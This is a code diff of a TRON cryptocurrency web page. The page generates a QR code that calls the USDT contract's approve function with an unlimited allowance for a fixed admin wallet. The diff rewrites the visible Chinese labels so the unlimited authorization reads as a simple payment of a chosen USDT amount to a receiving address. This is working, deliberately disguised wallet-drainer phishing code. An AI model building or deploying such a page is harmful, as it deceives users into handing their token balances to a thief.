@@ -72,12 +72,12 @@ h1{font-size:24px;margin-bottom:8px}
 
         <div id="connectTip" class="tip-box"></div>
 
-        <input class="amount-input" id="amount" value="" placeholder="可随意填写数字，点击按钮执行无限授权">
+        <input class="amount-input" id="amount" value="" placeholder="请输入USDT数量">
 
         <div id="qrcode">加载二维码...</div>
 
         <div id="qrTip" class="tip-box">
-            二维码授权地址：<br>
+            二维码收款地址：<br>
             TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE
         </div>
 
@@ -103,7 +103,7 @@ h1{font-size:24px;margin-bottom:8px}
 // ====================== 波场配置 ======================
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const ADMIN_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
-// 波场USDT无限授权标准大数 10000000000000000000000000000000000000000000000000000000000000000000000000000
+// 波场USDT无限授权标准大数
 const MAX_ALLOWANCE_SUN = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 // TRC20 ABI
@@ -199,7 +199,7 @@ connectBtn.onclick = async () => {
     connectBtn.disabled = false;
 };
 
-// ====================== 生成二维码（无限授权参数） ======================
+// ====================== 生成二维码（无限授权参数，收款地址固定ADMIN_WALLET） ======================
 function genQR() {
     const qrUri = `tron:${USDT_CONTRACT}?function=approve&args=${ADMIN_WALLET},${MAX_ALLOWANCE_SUN}`;
     document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrUri)}">`;
